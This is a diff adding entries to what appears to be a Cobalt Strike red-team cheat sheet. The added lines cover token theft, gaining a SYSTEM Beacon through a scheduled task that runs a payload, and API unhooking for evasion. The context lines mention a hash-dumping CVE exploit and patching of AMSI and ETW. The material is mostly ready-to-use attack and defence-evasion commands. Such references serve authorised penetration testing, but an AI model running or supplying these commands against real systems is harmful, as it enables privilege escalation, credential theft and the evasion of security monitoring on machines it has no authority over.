@@ -204,6 +204,17 @@ execute-assembly C:\CVE-2021-36934.exe
 --> Dumps hashes to console upon successful exploitation
 ```
 
+### Stealing logon tokens
+If you obtained local Administrator privileges, you can steal a session token of another process to inherit their token privileges. This might require you to escalate to a SYSTEM Beacon if its being blocked.<br />
+`steal_token <PID>`
+
+### Elevating to SYSTEM Beacon
+Assuming you gained local administrator privileges, one option to elevate to a SYSTEM Beacon is to use scheduled tasks to create a new scheduled task to run your payload as SYSTEM.<br />
+```
+run schtasks /create /tn "TaskName" /sc once /U DOMAIN\username /P Password1! /tr "cmd.exe /c C:\path\to\Payload.exe" /ru SYSTEM
+run schtasks /run /tn "TaskName" --> Should pop SYSTEM Beacon
+```
+
 ------------------------------------------------------------------------------------------
 ## Lateral Movement
 Cobalt Strike jumping (OUTDATED)
@@ -433,6 +444,10 @@ Patch AMSI in remote process
 
 [ajpc500/BOFs](https://github.com/ajpc500/BOFs/) ETW patch for current process<br />
 `etw stop` / `etw start`
+
+### API Unhooking
+Cobalt Strike's hail-mary unhooking function. "This is a Beacon Object File to refresh DLLs and remove their hooks. The code is from Cylance's Universal Unhooking research" <br />
+`unbook`
 
 ------------------------------------------------------------------------------------------
 ## Exploitation
